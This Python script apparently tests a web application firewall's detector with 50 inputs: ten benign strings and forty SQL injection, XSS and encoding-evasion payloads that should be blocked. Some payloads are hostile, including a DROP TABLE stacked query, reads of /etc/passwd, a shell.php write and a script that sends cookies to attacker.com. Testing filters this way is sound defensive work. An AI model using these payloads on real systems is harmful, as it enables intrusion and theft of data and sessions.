from detectors import scan_payload
import time

def run_comprehensive_tests():
    test_cases = [
        # === [SECTION 1: NORMAL TRAFFIC - False Positive Check (1-10)] ===
        {"name": "Normal Search", "payload": "how to learn python", "exp": "ALLOW"},
        {"name": "Normal Email", "payload": "user@example.com", "exp": "ALLOW"},
        {"name": "Normal URL", "payload": "https://www.google.com/search?q=waf", "exp": "ALLOW"},
        {"name": "Product Review", "payload": "This product is great! I love it.", "exp": "ALLOW"},
        {"name": "Address Input", "payload": "123/45 Sukhumvit Rd, Bangkok", "exp": "ALLOW"},
        {"name": "Chat Message", "payload": "Select the red one, not the blue one.", "exp": "ALLOW"}, # select keyword in context
        {"name": "Technical Question", "payload": "How to use 'union' in set theory?", "exp": "ALLOW"}, # union keyword in context
        {"name": "Math Equation", "payload": "1 + 1 = 2", "exp": "ALLOW"},
        {"name": "Code Snippet (Safe)", "payload": "print('Hello World')", "exp": "ALLOW"},
        {"name": "Input with Quotes", "payload": "It's a beautiful day!", "exp": "ALLOW"},

        # === [SECTION 2: SQL INJECTION - Basic to Advanced (11-25)] ===
        {"name": "SQLi: Tautology 1", "payload": "' OR '1'='1", "exp": "BLOCK"},
        {"name": "SQLi: Tautology 2", "payload": "admin' --", "exp": "BLOCK"},
        {"name": "SQLi: Union Select", "payload": "1' UNION SELECT NULL, NULL, NULL --", "exp": "BLOCK"},
        {"name": "SQLi: Information Schema", "payload": "' UNION SELECT table_name FROM information_schema.tables--", "exp": "BLOCK"},
        {"name": "SQLi: Error-based", "payload": "OR 1=1 GROUP BY password HAVING 1=1", "exp": "BLOCK"},
        {"name": "SQLi: Stacked Query", "payload": "1; DROP TABLE users", "exp": "BLOCK"},
        {"name": "SQLi: Time-based (Sleep)", "payload": "1' AND SLEEP(5)--", "exp": "BLOCK"},
        {"name": "SQLi: Time-based (Waitfor)", "payload": "'; WAITFOR DELAY '0:0:5'--", "exp": "BLOCK"},
        {"name": "SQLi: Blind (If)", "payload": "IF(1=1, SLEEP(5), 0)", "exp": "BLOCK"},
        {"name": "SQLi: Blind (Case)", "payload": "SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END", "exp": "BLOCK"},
        {"name": "SQLi: Load File", "payload": "UNION SELECT LOAD_FILE('/etc/passwd')", "exp": "BLOCK"},
        {"name": "SQLi: Into Outfile", "payload": "SELECT 'hack' INTO OUTFILE '/var/www/html/shell.php'", "exp": "BLOCK"},
        {"name": "SQLi: Hex Payload", "payload": "0x53454c454354202a2046524f4d207573657273", "exp": "BLOCK"},
        {"name": "SQLi: Order By Probe", "payload": "1' ORDER BY 10--", "exp": "BLOCK"},
        {"name": "SQLi: Char Injection", "payload": "SELECT CHAR(115,101,108,101,99,116)", "exp": "BLOCK"},

        # === [SECTION 3: XSS - Reflected, DOM, & Obfuscated (26-40)] ===
        {"name": "XSS: Basic Script", "payload": "<script>alert(1)</script>", "exp": "BLOCK"},
        {"name": "XSS: Image OnError", "payload": "<img src=x onerror=alert(1)>", "exp": "BLOCK"},
        {"name": "XSS: SVG OnLoad", "payload": "<svg/onload=alert(1)>", "exp": "BLOCK"},
        {"name": "XSS: Body OnLoad", "payload": "<body onload=alert(1)>", "exp": "BLOCK"},
        {"name": "XSS: Javascript Protocol", "payload": "javascript:alert(1)", "exp": "BLOCK"},
        {"name": "XSS: Iframe Srcdoc", "payload": "<iframe srcdoc='<script>alert(1)</script>'>", "exp": "BLOCK"},
        {"name": "XSS: Attribute Injection", "payload": "' onmouseover='alert(1)", "exp": "BLOCK"},
        {"name": "XSS: autofocus/onfocus", "payload": "<input autofocus onfocus=alert(1)>", "exp": "BLOCK"},
        {"name": "XSS: Template Literal", "payload": "`${alert(1)}`", "exp": "BLOCK"},
        {"name": "XSS: FromCharCode", "payload": "String.fromCharCode(88,83,83)", "exp": "BLOCK"},
        {"name": "XSS: Document Cookie", "payload": "<script>document.location='http://attacker.com?c='+document.cookie</script>", "exp": "BLOCK"},
        {"name": "XSS: Meta Refresh", "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>", "exp": "BLOCK"},
        {"name": "XSS: innerHTML Assign", "payload": "element.innerHTML = '<img src=x onerror=alert(1)>'", "exp": "BLOCK"},
        {"name": "XSS: Base64 URI", "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "exp": "BLOCK"},
        {"name": "XSS: Polyglot", "payload": "jaVasCript:/*-/*`/*\\'/*\"/*( /* */oNcliCk=alert() )//", "exp": "BLOCK"},

        # === [SECTION 4: EVASION & OBFUSCATION - The Ultimate Test (41-50)] ===
        {"name": "Evasion: Double URL Enc", "payload": "%253Cscript%253Ealert(1)%253C/script%253E", "exp": "BLOCK"},
        {"name": "Evasion: HTML Hex Entity", "payload": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;", "exp": "BLOCK"},
        {"name": "Evasion: Null Byte", "payload": "<scr\0ipt>alert(1)</script>", "exp": "BLOCK"},
        {"name": "Evasion: Comment in SQL", "payload": "SEL/**/ECT * FR/**/OM users", "exp": "BLOCK"},
        {"name": "Evasion: MySQL Wrap", "payload": "/*!50000 SELECT */ * FROM users", "exp": "BLOCK"},
        {"name": "Evasion: Unicode Escape", "payload": r"\u003cscript\u003ealert(1)\u003c/script\u003e", "exp": "BLOCK"},
        {"name": "Evasion: Mixed Encoding", "payload": "%253Cimg%20src%3Dx%20onerror%3D%22alert(1)%22%3E", "exp": "BLOCK"},
        {"name": "Evasion: Newline Inject", "payload": "UNION\nSELECT\nNULL", "exp": "BLOCK"},
        {"name": "Evasion: Tab Obfuscation", "payload": "UNION\tSELECT\t1", "exp": "BLOCK"},
        {"name": "Evasion: Complex Polyglot", "payload": "\"'><script>alert(1)</script>", "exp": "BLOCK"}
    ]

    print("="*100)
    print(f"{'WAF ULTIMATE TEST SUITE (50 CASES)':^100}")
    print("="*100)
    print(f"{'#':<3} | {'Test Name':<35} | {'Score':<6} | {'Status':<8} | {'Detection'}")
    print("-" * 100)

    passed = 0
    start_time = time.time()

    for i, case in enumerate(test_cases, 1):
        result = scan_payload(case["payload"])
        action = "BLOCK" if result["is_blocked"] else "ALLOW"
        is_correct = action == case["exp"]
        
        if is_correct: passed += 1
        
        status = "✅ PASS" if is_correct else "❌ FAIL"
        score = result["total_score"]
        dtype = result["attack_type"] if result["attack_type"] else "-"

        print(f"{i:<3} | {case['name']:<35} | {score:<6} | {status:<8} | {dtype}")

    end_time = time.time()
    print("-" * 100)
    print(f"OVERALL RESULT: {passed}/{len(test_cases)} Passed")
    print(f"Total Time: {end_time - start_time:.2f} seconds")
    print("="*100)

if __name__ == "__main__":
    run_comprehensive_tests()